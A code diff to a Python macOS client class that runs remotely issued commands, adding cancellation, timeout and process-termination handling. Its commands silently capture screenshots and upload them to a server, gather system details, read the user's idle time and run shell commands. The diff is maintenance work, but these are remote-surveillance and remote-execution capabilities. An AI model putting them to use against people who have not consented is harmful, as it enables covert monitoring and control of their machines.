@@ -8,7 +8,9 @@ from client.commands.argument_command_registry import (
     ArgumentOptionSpec,
     argument_command,
 )
+from client.commands.command_context import CommandCancelledError, CommandTimeoutError
 from client.commands.common import CommonCommands
+from client.commands.interrupts import interruptible
 from core.utils.decorator import desc
 from core.utils.formatting import get_time, format_dict
 from core.utils.logger import logger
@@ -45,7 +47,7 @@ class MacCommands(CommonCommands):
 
     def _run_command_text(self, command: str) -> str:
         try:
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, text=True, encoding='utf-8', errors='replace')
+            result = self._run_shell_command(command, timeout=15)
             if result.returncode != 0:
                 return ''
             return (result.stdout or '').strip()
@@ -77,16 +79,25 @@ class MacCommands(CommonCommands):
             'cwd': os.getcwd()
         }
 
-    def _escape_osascript_text(self, value: str) -> str:
+    def _escape_osascript_text(self, value: str):
         text = str(value or '')
         text = text.replace('\\', '\\\\')
         text = text.replace('"', '\\"')
         return text
 
     def _spawn_osascript(self, applescript: str):
-        return subprocess.Popen(['osascript', '-e', applescript], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+        process = subprocess.Popen(
+            ['osascript', '-e', applescript],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True
+        )
+        self._register_cancel_handler(lambda: self._terminate_process(process))
+        return process
 
     @desc("Capture a screenshot", group='platform')
+    @interruptible()
     def screenshot(self):
         screenshot_path = f'screenshot_{get_time()}.png'
         capture_command = f'screencapture -x {screenshot_path}'
@@ -99,7 +110,9 @@ class MacCommands(CommonCommands):
 
             self._send_interim_result(1, 'Screenshot captured successfully', 0)
             return self._upload_single_file_to_server_result(screenshot_path, category='screenshot')
-        except subprocess.TimeoutExpired:
+        except CommandCancelledError:
+            return 0, 'Screenshot command cancelled'
+        except (CommandTimeoutError, subprocess.TimeoutExpired):
             return 0, 'Screenshot capture timed out and was terminated'
         except Exception as e:
             return 0, f'Failed to capture screenshot: {e}'
@@ -111,19 +124,34 @@ class MacCommands(CommonCommands):
                     pass
 
     @desc('Show system information', group='platform')
+    @interruptible()
     def getinfo(self):
         try:
-            return 1, format_dict(self._build_process_info())
+            payload = self._run_interruptible(self._build_process_info)
+            return 1, format_dict(payload)
+        except CommandCancelledError:
+            return 0, 'Command cancelled'
+        except CommandTimeoutError:
+            return 0, 'Command timed out and was terminated'
         except Exception as e:
             logger.error(e, exc_info=True)
             return 0, f'Failed to collect system information: {e}'
 
     @desc('Show user idle time', group='platform')
+    @interruptible()
     def idletime(self):
         try:
             from Quartz import CGEventSourceSecondsSinceLastEventType, kCGEventSourceStateHIDSystemState, kCGAnyInputEventType
-            idle_seconds = CGEventSourceSecondsSinceLastEventType(kCGEventSourceStateHIDSystemState, kCGAnyInputEventType)
+            idle_seconds = self._run_interruptible(
+                CGEventSourceSecondsSinceLastEventType,
+                kCGEventSourceStateHIDSystemState,
+                kCGAnyInputEventType,
+            )
             return 1, f'User idle time: {idle_seconds:.2f} seconds'
+        except CommandCancelledError:
+            return 0, 'Command cancelled'
+        except CommandTimeoutError:
+            return 0, 'Command timed out and was terminated'
         except Exception as e:
             return 0, f'Failed to read idle time: {e}'
 
